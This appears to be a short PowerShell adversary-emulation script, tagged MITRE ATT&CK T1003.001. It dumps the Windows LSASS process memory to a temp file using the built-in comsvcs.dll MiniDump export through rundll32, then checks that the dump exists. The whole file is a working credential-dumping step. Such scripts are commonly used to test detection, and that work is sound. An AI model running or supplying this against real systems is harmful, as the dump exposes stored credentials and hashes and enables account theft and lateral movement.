<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    Dumping lsass process using built-in windows option 
#>
$dmpPath = "$env:TEMP\lsass.dmp"
rundll32.exe $env:windir\System32\comsvcs.dll, MiniDump (ps -Name lsass).id $dmpPath full

if (Test-Path $dmpPath) {
    Write-Host "Lsass dumped, $dmpPath has been created successfully"
} else {
    Write-Host "Error: $dmpPath has not been created"
}
